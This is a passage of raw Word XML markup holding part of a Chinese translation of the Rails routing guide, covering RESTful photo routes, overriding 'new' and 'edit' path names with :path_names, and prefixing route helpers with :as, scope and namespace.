        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5ADEE337" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="38C1C4B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POST </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7CA3FFB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 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3A96C10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create </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="44786C4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images_path </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="51AFD50E" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="33BFA5C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5A46786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/photos/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C854C4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show </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="00CCF3C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image_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="075019DE" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="618D5EC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077A557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/photos/:id/edit </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7B2E315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edit </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3626BDE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edit_image_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="7BB4B549" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="26FD100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PATCH/PUT </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="555D714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/photos/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7CCE9CB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update </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D5FB52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image_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4553C727" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5E9BACD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DELETE </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1543007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/photos/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="467488F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destroy </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7FB7B2D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image_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3A0C0B18"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 xml:space="preserve">4.4 覆盖 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>edit</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 片段</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B126F1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:path_names</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项能够让你把自动生成路径中的 “new” 和 “edit” 覆盖：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="62C3A2D5" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D3C70E4" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1400519995"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>resources :photos, :path_names</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :new</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'make', :edit</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'change'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="064AB49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这将会让 Rails 能够匹配这些请求：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2136"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="492361A2" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7AFE342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/photos/make</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0523CAA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/photos/1/change</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6D655752"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这个选项并不会改变控制器中的行为名称，这两个路径依然会被匹配到控制器中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>edit</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路径中去。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D3CBF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如果你想一次性地把一条设置应用到多个规则上，你可以用 scope 。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5256"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="2DA7C706" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4F44A13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scope :path_names</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :new</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "make"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>} do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16E996B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 rest of your routes</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A46EAB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188B08C6"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4.5 为命名（named） 路由 Helper 加上前缀</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DC545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你可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来为 命名路由的 Helper 加上一个前缀。这样可以防止Helper 名和其他的名字冲突。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5496"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="49685C33" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="279D7C1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scope "admin"</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5FADF49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:photos, :as</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "admin_photos"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F8E13B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p w14:paraId="7896FD7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5385A71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resources :photos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="43A5DC8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这样就将会产生 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>admin_photos_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new_admin_photo_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样的路由 Helper。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D0921B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在 scope 后面用上 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数，就可以为一组路由规则修改前缀：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4056"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0A1E2C71" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="726070E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scope "admin", :as</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "admin"</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78D849E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:photos, :accounts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C98D44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p w14:paraId="2E137C4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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C93B89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resources :photos, :accounts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="429B908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这样将会建立像 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>admin_photos_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>admin_accounts_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样的 helper ，他们分别对应 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/admin/photos</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/admin/accounts</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6503EAE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namespace</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> scope 将会自动为你添加 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ， </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:module</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 前缀。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6257565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你甚至还能为你的路由规则添加上一个 命名参数（named parameter）：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2616"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="25CDD68D" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B97365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scope ":username"</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030BB9E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:posts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73E7FC7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64AC9DF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这样将会让你 匹配上 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/bob/posts/1</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样的路径，并且在控制器，视图和 Helper 中会将 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>username</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
